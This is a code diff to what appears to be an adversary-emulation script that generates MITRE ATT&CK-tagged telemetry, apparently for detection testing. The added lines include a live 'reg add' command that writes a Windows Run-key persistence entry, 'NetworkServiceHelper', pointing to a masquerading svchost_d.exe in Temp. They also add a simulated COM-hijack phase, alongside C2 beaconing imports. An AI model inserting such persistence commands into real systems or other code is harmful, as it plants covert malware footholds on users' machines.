@@ -19,8 +19,9 @@ from pathlib import Path
 
 from telemetry_helper import check_environment, emit, EnvSafety, set_phase
 from c2_helper import fronted_beacon, emit_heartbeats, jittered_sleep, FRONT_DOMAINS
-from naming_helper import phase_delay
+from naming_helper import phase_delay, pick_com_description
 from defense_helper import emit_system_discovery, emit_process_discovery
+from persistence_helper import emit_registry_run, emit_com_hijack
 
 
 def main() -> int:
@@ -123,6 +124,25 @@ def main() -> int:
     shutil.rmtree(screenshots_dir, ignore_errors=True)
     emit("FILE", "DELETE_FILE", str(screenshots_dir), "INFO",
          source_process="svchost_d.exe", detail="Staging cleaned", technique_id="T1070.004")
+
+    # --- Phase 8: Registry Run Key Persistence (T1547.001) ---
+    emit_registry_run("svchost_d.exe", "NetworkServiceHelper",
+                      r"C:\Windows\Temp\svchost_d.exe")
+    try:
+        subprocess.run([
+            "reg", "add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+            "/v", "NetworkServiceHelper", "/t", "REG_SZ",
+            "/d", r"C:\Windows\Temp\svchost_d.exe", "/f"
+        ], capture_output=True, timeout=10)
+    except Exception:
+        pass
+    time.sleep(phase_delay("persistence"))
+
+    # --- Phase 9: COM Hijack for stealth persistence (T1574.002) ---
+    com_desc = pick_com_description()
+    emit_com_hijack("svchost_d.exe", com_desc)
+    time.sleep(phase_delay("com_hijack"))
+
     emit("PROCESS", "EXIT_PROCESS", "svchost_d.exe", "INFO",
          source_process="svchost_d.exe", files_found=found)
     return 0
